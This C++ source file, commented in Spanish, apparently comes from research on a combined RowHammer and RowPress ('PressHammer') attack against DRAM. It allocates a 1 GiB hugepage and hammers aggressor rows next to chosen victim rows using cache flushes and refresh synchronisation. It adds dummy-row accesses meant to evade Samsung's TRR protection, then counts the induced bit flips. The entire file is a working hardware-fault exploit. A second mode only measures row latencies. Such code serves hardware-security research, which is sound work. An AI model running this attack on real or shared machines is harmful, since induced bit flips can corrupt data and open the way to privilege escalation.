//==========================================================================
//                              LIBRERIAS    
//==========================================================================
#include <iostream>
#include <fstream>
#include <immintrin.h> //Contiene instrucciones para procesadores Intel
#include <random>
#include <algorithm>
#include <stdio.h>
#include <unistd.h>
#include <inttypes.h>
#include <utility>
#include <linux/kernel-page-flags.h>
#include <fcntl.h> // Biblioteca POSIX del lenguaje de programacion C que contiene instrucciones para el control de archivos
#include <bits/stdc++.h>
#include <sched.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <getopt.h>

#include "Hist.h"
#include "Mapping.h"

//==========================================================================







//==========================================================================
//                        VARIABLES GLOBALES    
//==========================================================================
std::vector<std::pair<ulong, ulong>> hypothetically_conflicting_addresses;
std::vector<unsigned long long> record;
std::mt19937 rng;
//==========================================================================







//==========================================================================
//                     SUBPROGRAMAS AUXILIARES   
//==========================================================================
void dump_record(std::string fn)
{
    // Registra todas las entradas a un archivo binario
    std::ofstream ofs(fn, std::ios::binary);
    for (auto &r : record)
        ofs.write((char *)&r, sizeof(r));
}

// Subprograma para generar direcciones aleatorias
uintptr_t generate_random_address(uintptr_t arr, std::uniform_int_distribution<unsigned> &dist)
{
    int row_offset = dist(rng);
    return arr + row_offset * (8192);
}

// Subprograma para comprobar los bitflips
int check_bit_flips(Mapping &victim, unsigned long long victim_data)
{
    int no_bit_flips = 0;
    for (int i = 0 ; i < 8192/sizeof(unsigned long long) ; i++)
    {
        //std::cout << std::hex << (*(unsigned long long*) victim.to_virt()) << std::dec << std::endl;
        no_bit_flips += __builtin_popcountll((*(unsigned long long*) victim.to_virt()) ^ victim_data);
        victim.increment_column_dw();
    }
    victim.reset_column();
    return no_bit_flips;
}


// Subprograma para inicializar las filas
void initialize_rows(Mapping &victim, Mapping &aggr1, Mapping &aggr2, Mapping *dummy, int no_dummy_rows, unsigned long long victim_data)
{
    for (int i = 0 ; i < 8192/sizeof(unsigned long long) ; i++)
    {
        *((unsigned long long*) victim.to_virt()) = victim_data;
        *((unsigned long long*) aggr1.to_virt()) = ~victim_data;
        *((unsigned long long*) aggr2.to_virt()) = ~victim_data;
        // Se limpia la fila victima
        asm volatile("clflush (%0)" : : "r" ((unsigned long long*) victim.to_virt()) : "memory");
        // also warmup the dummy rows
        for (int j = 0 ; j < no_dummy_rows ; j++)
        {
            *((unsigned long long*) dummy[j].to_virt()) = 0x0;
            dummy[j].increment_column_dw();  
        }

        victim.increment_column_dw();
        aggr1.increment_column_dw();
        aggr2.increment_column_dw();
    }

    victim.reset_column();
    aggr1.reset_column();
    aggr2.reset_column();

    for (int j = 0 ; j < no_dummy_rows ; j++)
        dummy[j].reset_column();
}
//==========================================================================







//==========================================================================
//                          ATAQUE PRESSHAMMER    
//==========================================================================
/**
 * 
 * @param target puntero a 1 GiB de memoria fisica contigua 
 */
__attribute__((optimize("unroll-loops")))
int do_samsung_utrr(uintptr_t target, int no_aggr_acts, int no_reads, int victim_count)
{
    int no_sync_acts = 2;   // Las veces que se van a activar las filas agresoras de sincronicación 
    int no_dummy_acts = 4;  // Las veces que se van a activar las filas dummy. Estas filas están situadas en diferentes bancos 

    // Este valor es muy arbitrario, es la cantidad de tiempo que se va a aplicar hammering, en este caso es mucho. 
    // Se espera que la sincronizacion por la señal REF trabaje en nuestro favor 
    int iteration_per_victim = 8205*100; 

    // Enmascara la mayoria de bits significativos: los bits después del bit 30 (i.e., limite de GiB)
    uintptr_t most_significant_bits = ((uintptr_t) target) & ~((1ULL << 30ULL) - 1);

    // Inicializa  mt PRNG
    rng.seed(1337); 
    int no_of_rows = (1ULL << 30)/8192; 
    std::cout << " no_of_rows " << no_of_rows << std::endl;
    std::uniform_int_distribution<unsigned> dist(0,no_of_rows);

    // Se crean los objetos para las direcciones de la fila victima, las agresoras y las dummy
    Mapping base_victim;
    Mapping victim;
    Mapping aggr1;
    Mapping aggr2;

    // Filas que se van a usar para la sincronizacion con el refresco 
    Mapping sync1;
    Mapping sync2;
    Mapping dummy_rows[16];

    Hist h(100);
    Hist h_hammer(100);
    Hist gl(100);

    // Arreglo atb para la generacion de la fila victima 
    base_victim.decode_new_address(target);
    base_victim.reset_column();

    int total_bitflips = 0;

    struct timespec tglob1, tglob2;

    // En cada iteracion se testea una nueva fila victima
    // 14000 es un numero arbitrario que se usa como un desplazamiento (offset) en la direccion de la fila desde la fila victima base
    for (int i = 14000; i < 14000 + victim_count; i++)
    {
        victim = Mapping(base_victim);
        for (int j = 0 ; j < i ; j++){
            victim.increment_row();
        }
            
        // Se encuentran las filas agresivas, aquellas adyacentes a la fila victima (una arriba y una abajo, manteniendo la victima en el medio)
        aggr1 = Mapping(victim); aggr1.increment_row();
        aggr2 = Mapping(victim); aggr2.decrement_row();

        // Se encuentran las filas de sincronizacion, estas deberian estar separadas de las victimas y agresoras 
        sync1 = Mapping(victim);
        sync2 = Mapping(victim);
        for (int j = 0 ; j < 1000 ; j++){
            sync1.increment_row();
            sync2.increment_row();
        }
        sync2.increment_row(); // Se incrementa en uno o dos mas una de las filas para tener dos filas de sicronizacion diferentes 

        // Se muestra la fila victima y las agresoras que van a ser probadas
        std::cout << "Bank " << victim.get_bank() << " Victim Row " << victim.get_row() << " Aggr1 Row " << aggr1.get_row() << " Aggr2 Row " << aggr2.get_row() << std::endl;
        
        // Se asignan filas cercanas a la victima como direcciones de fila dummy. Se crean 16 para hacer el bypass del TRR (visto en la memoria)
        for (int j = 0 ; j < 16 ; j++){
            dummy_rows[j] = Mapping(victim);

            for (int k = 0 ; k < j + 100 ; k++){
                dummy_rows[j].increment_row();
            }
            // En caso de querer mostrar cuales son las filas dummy
            //std::cout << "Dummy Row " << j << " " << dummy_rows[j].get_row() << std::endl;
        }

        // Se inicializa la victima y las filas cercanas con el patron del checkerboard (visto en la memoria)
        initialize_rows(victim, aggr1, aggr2, dummy_rows, 16, 0x5555555555555555ULL);

        // Se calcula las direcciones virtuales de todas las filas creadas 
        // 2 filas de sincronizacion, Acceden a los bloques de cache "no_sync_acts" 
        volatile unsigned long long *sync_a[no_sync_acts*2];
        // 2 filas agresoras, Acceden a los bloques de cache "no_aggr_acts" 
        volatile unsigned long long *aggr_a[256];
        // 16 filas dummy, Acceden a los bloques de cache "no_dummy_acts" 
        volatile unsigned long long *dummy_a[no_dummy_acts*16];


        // El arrayy sync_a almacena punteros a las filas de sincronizacion
        for (int j = 0 ; j < no_sync_acts ; j++)
        {
            sync_a[j*2 + 0] = (volatile unsigned long long *) (sync1.to_virt()); // sync_a[j*2 + 0] hace referencia a la fila de sincronizacion 1
            sync_a[j*2 + 1] = (volatile unsigned long long *) (sync2.to_virt()); // sync_a[j*2 + 1] hace referencia a la fila de sincronizacion 2
            sync1.increment_column_cb();
            sync2.increment_column_cb();
        }

        sync1.reset_column();
        sync2.reset_column();

        // El array aggr_a almacena punteros a las filas agresoras 
        for (int j = 0 ; j < 128 ; j++)
        {
            aggr_a[j*2 + 0] = (volatile unsigned long long *) (aggr1.to_virt()); // aggr_a[j*2 + 0] hace referencia a la fila agresora 1
            aggr_a[j*2 + 1] = (volatile unsigned long long *) (aggr2.to_virt()); // aggr_a[j*2 + 1] hace referencia a la fila agresora 2
            aggr1.increment_column_cb();
            aggr2.increment_column_cb();
        }

        aggr1.reset_column();
        aggr2.reset_column();

        // El array dummy_a almacena punteros a las filas dummy 
        for (int j = 0 ; j < no_dummy_acts ; j++){
            for (int k = 0 ; k < 16 ; k++){

                dummy_a[j*16 + k] = (volatile unsigned long long *) (dummy_rows[k].to_virt());
                dummy_rows[k].increment_column_cb();
            }
        }

        for (int j = 0 ; j < no_dummy_acts ; j++){
            for (int k = 0 ; k < 16 ; k++){
                dummy_rows[k].reset_column();
            }
        }

        unsigned cycles_low, cycles_high, cycles_low1, cycles_high1;
        unsigned gl_cycles_low, gl_cycles_high, gl_cycles_low1, gl_cycles_high1;
        struct timespec t1, t2;
        unsigned cycles_total = 0;

        // Se calienta el vector para el registro
        record.clear();
        for (int j = 0 ; j < iteration_per_victim ; j++){
            record.push_back(0);
        }
            
        for (int j = 0; j < 10; j++){
            sched_yield();
        }
            
     
        // Expulsar filas utilizadas en la sincronizacion con el refresco 
        for (int j = 0 ; j < no_sync_acts ; j++)
        {
            *(sync_a[j*2 + 0]);
            *(sync_a[j*2 + 1]);
            asm volatile("clflush (%0)" : : "r" (sync_a[j*2 + 0]) : "memory");
            asm volatile("clflush (%0)" : : "r" (sync_a[j*2 + 1]) : "memory");
        }   

        // ------------------ SINCRONIZAR con REF ------------------
        while (true)
        {
            asm volatile ("lfence");

            clock_gettime(CLOCK_REALTIME, &t1);


            // Probar tiempos de <no_intentos> y numero medio de ciclos 
            for (int j = 0 ; j < no_sync_acts ; j++)
            {
                *(sync_a[j*2 + 0]);
                *(sync_a[j*2 + 1]);
                asm volatile("clflush (%0)" : : "r" (sync_a[j*2 + 0]) : "memory");
                asm volatile("clflush (%0)" : : "r" (sync_a[j*2 + 1]) : "memory");
                // Para acceder a diferentes bloques de cache en la fila agresora
            }   

            // Para inmediatamente despues de deducir que se ha producido un REF recientemente
            // i.e., it took four row conflicts more than 1K cycles to execute
            clock_gettime(CLOCK_REALTIME, &t2);
            if (t2.tv_nsec - t1.tv_nsec > 450) // 450ns ~= 1K TSC cycles
                break;
        }


        // ------------------ PRESSHAMMER (ROWHAMMER + ROWPRESS) ------------------

        // Para cada iteracion, se activa y se lee con la cantidad especificada; y se refresca de nuevo 
        for (int j = 0 ; j < iteration_per_victim ; j++)
        {
            asm volatile("lfence");
 
            clock_gettime(CLOCK_REALTIME, &tglob1);

            // Se activa tantas veces como no_aggr_acts 
            for (int k = 0 ; k < no_aggr_acts ; k++)
            {
                asm volatile("mfence");
                // Para cada activacion se leen ambas agresoras no_reads veces, lo que ajustara el tiempo del agresor
                for (int i = 0 ; i < no_reads ; i++)
                    *(aggr_a[i*2 + 0]); // Se lee la fila agresora 1

                for (int i = 0 ; i < no_reads ; i++)
                    *(aggr_a[i*2 + 1]); // Se lee la fila agresora 2

                // Limpiar las lineas de cache asi se puede acceder a la DRAM de nuevo en la siguiente iteracion 
                for (int i = 0 ; i < no_reads ; i++)
                    asm volatile("clflushopt (%0)" : : "r" (aggr_a[i*2 + 0]) : "memory");

                for (int i = 0 ; i < no_reads ; i++)
                    asm volatile("clflushopt (%0)" : : "r" (aggr_a[i*2 + 1]) : "memory");
            }   

            // Se realizan accesos a las filas dummy para evitar el mecanismo TRR 
            for (int k = 0 ; k < no_dummy_acts ; k++)
            {
                asm volatile("mfence");
                for (int l = 0 ; l < 16 ; l++)
                    *(dummy_a[k*16 + l]);
                for (int l = 0 ; l < 16 ; l++)
                    asm volatile("clflush (%0)" : : "r" (dummy_a[k*16 + l]) : "memory");
            }   

            asm volatile ("mfence");

            // ------------------ SINCRONIZAR con REF ------------------
            while (true) 
            {
                asm volatile ("lfence");
                clock_gettime(CLOCK_REALTIME, &t1);


                // Probar tiempos de <no_intentos> y numero medio de ciclos 
                for (int k = 0 ; k < no_sync_acts ; k++)
                {
                    *(sync_a[k*2 + 0]);
                    *(sync_a[k*2 + 1]);
                    asm volatile("clflush (%0)" : : "r" (sync_a[k*2 + 0]) : "memory");
                    asm volatile("clflush (%0)" : : "r" (sync_a[k*2 + 1]) : "memory");
                }   

                // Para inmediatamente despues de deducir que se ha producido un REF recientemente
                // i.e., it took four row conflicts more than 1K cycles to execute
                clock_gettime(CLOCK_REALTIME, &t2);
                if (t2.tv_nsec - t1.tv_nsec > 450) // 450ns ~= 1K TSC cycles
                    break;

            }

            clock_gettime(CLOCK_REALTIME, &tglob2);
            record[j] = tglob2.tv_nsec - tglob1.tv_nsec;
            
        } // ------------------ FIN PRESSHAMMER ------------------

        // ------------------ FIN.  ------------------

        asm volatile("mfence");

        for (int j = 0; j < 10; j++){
            sched_yield();
        }
            
        
        // Se acumula el numero total de bitflips con el recuento de activaciones y el numero de lecturas dados en todas las filas victimas probadas 
        int bitflips = check_bit_flips(victim, 0x5555555555555555ULL);
        total_bitflips += bitflips;
        std::cout << "Victim " << victim.get_row() << " done. " << std::endl; 

        // Mediana del registro
        if (iteration_per_victim > 1)
        {
            std::sort(record.begin(), record.end());
            std::cout << record[iteration_per_victim/2] << "ns" << std::endl;
        }

        std::cout << "[REPORT] Row " << i+1 << " with bit flip count " << bitflips << std::endl;
    }

    return total_bitflips;
}
//==========================================================================







//==========================================================================
//                           VERIFICACIÓN tAggON    
//==========================================================================
/**
 * @param target puntero a 1 GiB de memoria fisica contigua 
 */
__attribute__((optimize("unroll-loops")))
int verify_tAggOn(uintptr_t target)
{
    // Se abre latency.txt para la escritura 
    std::ofstream latency_file;
    latency_file.open("latency.txt");

    // Se inicializa mt PRNG
    rng.seed(1337); 
    int no_of_rows = (1ULL << 30)/8192; 
    std::uniform_int_distribution<unsigned> dist(0,no_of_rows);
    
    Mapping aggr1;
    Mapping aggr2;
    Mapping temp;

    struct timespec tglob1, tglob2, tglob3;
    unsigned cycles_low, cycles_high, cycles_low1, cycles_high1;

    uintptr_t random_address = generate_random_address(target, dist);


    // generate two row addresses far away from each other (aggr1 and aggr2)
    aggr1.decode_new_address(random_address);
    aggr1.reset_column();

    aggr2.decode_new_address(random_address);
    aggr2.reset_column();

    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();
    aggr2.increment_row(); aggr2.increment_row(); aggr2.increment_row();


    // access temp once between aggr1 and aggr2 to try to bring
    // system state back to the initial state
    temp.decode_new_address(random_address);
    temp.reset_column();

    temp.increment_row(); temp.increment_row(); temp.increment_row();
    temp.increment_row(); temp.increment_row(); temp.increment_row();
    temp.increment_row(); temp.increment_row(); temp.increment_row();
    temp.increment_row(); temp.increment_row(); temp.increment_row();
    temp.increment_row(); temp.increment_row(); temp.increment_row();
    
    // 2 aggressors, "no_aggr_acts" cache blocks accessed each
    volatile unsigned long long *aggr_a1[128];
    volatile unsigned long long *aggr_a2[128];


    volatile unsigned long long *temp_a;
    for (int j = 0 ; j < 128 ; j++)
    {
        aggr_a1[j] = (volatile unsigned long long *) (aggr1.to_virt());
        aggr_a2[j] = (volatile unsigned long long *) (aggr2.to_virt());
        // print aggra[j*2 + 0]
        aggr1.increment_column_cb();
        aggr2.increment_column_cb();
    }

    temp_a = (volatile unsigned long long *) (temp.to_virt());
       
    for (int i = 0 ; i < 128 ; i++)
        asm volatile("clflushopt (%0)" : : "r" (aggr_a1[i]) : "memory");
    for (int i = 0 ; i < 128 ; i++)
        asm volatile("clflushopt (%0)" : : "r" (aggr_a2[i]) : "memory");

    int values_aggr1[128] = {0};
    int values_aggr2[128] = {0};
    
    for (int i = 0 ; i < 128 ; i++){
        values_aggr1[i] = 0;
        values_aggr2[i] = 0;
    }

    // ------------------ CALENTAMIENTO PARA FUTURA MEDICION ------------------
    // Test <no_tries> times and average # of cycles
    for (int iters = 0; iters < 100000; iters++)
    {
        for (int k = 0; k < 128; k++)
        {
            clock_gettime(CLOCK_REALTIME, &tglob1); // Recoge el tiempo incial
            *(aggr_a1[k]);  // Accede a la fila agresora 1
            *(aggr_a2[k]);  // Accede a la fila agresora 2
            *(temp_a);      // Accede a la fila intermedia para estabilizar el sistema
            asm volatile("lfence");
            clock_gettime(CLOCK_REALTIME, &tglob2); // Captura el tiempo final


            values_aggr1[k] = tglob2.tv_nsec - tglob1.tv_nsec; // Guarda el tiempo de acceso para la fila 1
            values_aggr2[k] = tglob2.tv_nsec - tglob1.tv_nsec; // Guarda el tiempo de acceso para la fila 2
            asm volatile("mfence");
        }
        
        // Se vuelve a limpiar la caché para forzar que las lecturas se realizan a la DRAM y no a la caché
        for (int i = 0; i < 128; i++){
            asm volatile("clflushopt (%0)" :: "r"(aggr_a1[i]) : "memory");
        }
            
        for (int i = 0; i < 128; i++){
            asm volatile("clflushopt (%0)" :: "r"(aggr_a2[i]) : "memory");
        }
            
        // Garantiza que todas las operaciones de memria se completen
        asm volatile("mfence");

        // Se registran las latencias de las filas agresoras
        latency_file << "aggr1 ";
        for (int i = 0 ; i < 128 ; i++){
            latency_file << std::dec << values_aggr1[i] << " ";
        }     
        latency_file << std::endl;
        latency_file << "aggr2 ";

        for (int i = 0 ; i < 128 ; i++){
            latency_file << std::dec << values_aggr2[i] << " ";
        }  
        latency_file << std::endl;
        
    }

    // Se limpian los valores de las filas
    for (int i = 0 ; i < 128 ; i++){
        values_aggr1[i] = 0;
        values_aggr2[i] = 0;
    }
    
    // Se limpia la caché para evitar problemas futuros
    for (int i = 0 ; i < 128 ; i++)
        asm volatile("clflushopt (%0)" : : "r" (aggr_a1[i]) : "memory");
    for (int i = 0 ; i < 128 ; i++)
        asm volatile("clflushopt (%0)" : : "r" (aggr_a2[i]) : "memory");
    
    asm volatile("mfence");


    // ------------------ MEDICIÓN ------------------
    for (int iters = 0 ; iters < 100000 ; iters++)
    {
        // Medición para la fila agresora 1
        for (int k = 0 ; k < 128 ; k++)
        {

            clock_gettime(CLOCK_REALTIME, &tglob1);
            
            *(aggr_a1[k]);
            asm volatile("lfence");

            clock_gettime(CLOCK_REALTIME, &tglob2);

            values_aggr1[k] = tglob2.tv_nsec - tglob1.tv_nsec;

            asm volatile("mfence");
        }

        *(temp_a);
        asm volatile("clflushopt (%0)" : : "r" (temp_a) : "memory");
        asm volatile("mfence");

        // Medición para la fila agresora 2
        for (int k = 0 ; k < 128 ; k++)
        {

            clock_gettime(CLOCK_REALTIME, &tglob1);

            *(aggr_a2[k]);
            asm volatile("lfence");

            clock_gettime(CLOCK_REALTIME, &tglob2);
            values_aggr2[k] = tglob2.tv_nsec - tglob1.tv_nsec;

            asm volatile("mfence");
        }

        // Se limpian las caché
        for (int i = 0 ; i < 128 ; i++)
            asm volatile("clflushopt (%0)" : : "r" (aggr_a1[i]) : "memory");
        for (int i = 0 ; i < 128 ; i++)
            asm volatile("clflushopt (%0)" : : "r" (aggr_a2[i]) : "memory");

        asm volatile("mfence");

        // Se registran los resultados en el archivo
        latency_file << "aggr1 ";
        for (int i = 0 ; i < 128 ; i++){
            latency_file << std::dec << values_aggr1[i] << " ";
        }
        latency_file << std::endl;

        latency_file << "aggr2 ";
        for (int i = 0 ; i < 128 ; i++){
            latency_file << std::dec << values_aggr2[i] << " ";
        }
        latency_file << std::endl;

        asm volatile("mfence");
    }

    // Se cierra el archivo de registro de latencias
    latency_file.close();

}
//==========================================================================







//==========================================================================
//                         COMIENZO DEL ALGORITMO
//==========================================================================
void physical_address_hammer(bool is_verify, int victim_count)
{
    std::cout << "Starting algorithm..." << std::endl;
    
    // Asignar una gran porción contiguo de memoria 
    ulong MEM_SIZE = 1ULL << 30ULL;
    volatile char *start_address = (volatile char *) 0x2000000000;
    const std::string hugetlbfs_mountpoint = "/mnt/huge/buff";
    volatile char *target = nullptr;

    FILE *fp;
    fp = fopen(hugetlbfs_mountpoint.c_str(), "w+");
    if (fp==nullptr) {
      std::cerr << "Could not mount superpage" << std::endl;
      exit(EXIT_FAILURE);
    }

    auto mapped_target = mmap((void *) start_address, MEM_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | (30UL << MAP_HUGE_SHIFT), fileno(fp), 0);
    if (mapped_target==MAP_FAILED) {
      perror("mmap");
      exit(EXIT_FAILURE);
    }
    target = (volatile char*) mapped_target;
   
    std::cerr << "Mounted superpage at " << std::hex << (uintptr_t) target << std::dec << std::endl;

    Mapping::base_address = (uintptr_t) target;
    
    if(is_verify){
        verify_tAggOn((uintptr_t) target);
    }
    else{
        const int experiment_count = 10; // Las veces que se van a leer las agresoras
        int no_reads_arr[experiment_count] = {1, 2, 4, 8, 16, 32, 48, 64, 80, 128}; // this array determines the index of no_reads_arr up to which that much read count can be fit into a refresh window with the given activation count
        int experiment_counts[4] = {7, 9, 10, 10}; // e.g., for activation count 3, we can perform number of reads upto no_reads_arr[experiment_counts[4-3]] = no_reads_arr[9] = 80 (not including)
        
        // Veces que se van a activar las agresoras 
        for(int i = 4; i > 0; i--){
            // Veces que se va a realizar una lectura despues de cada activacion 
            for(int j = 0; j < experiment_counts[4-i]; j++){
                std::cout << "[REPORT] Experiment with number of activations: " << i << " and number of reads: " << no_reads_arr[j] << std::endl;
                do_samsung_utrr((uintptr_t) target, i, no_reads_arr[j], victim_count);
            }
        }
    }
}
//==========================================================================







//==========================================================================
//                         PROGRAMA PRINCIPAL
//==========================================================================
int main(int argc, char *argv[])
{
    int index;
    int o;
    std::string line;

    bool is_verify = false; // Variable usada para verificar o no el tAggON 
    int victim_count = 1500; // Numero de filas victimas a la que aplicar hammer

    static struct option long_options[] = {
        {"verify", no_argument, 0, 'v'}, 
        {"num_victims", required_argument, 0, 'n'}, 
        {0, 0, 0, 0}
    };

    // Se comprueba que se le pasen los argumentos necesarios para ejecutar
    while ((o = getopt_long(argc, argv, "vn:", long_options, &index)) != -1)
    {
        switch (o)
        {
            case 'n':
            {
                victim_count = std::atoi(optarg);
                break;
            }
            case 'v':
            {
                is_verify = true;
                break;
            }
        }
    }

    //Empieza el ataque
    physical_address_hammer(is_verify, victim_count);
    exit(0);
}
//==========================================================================

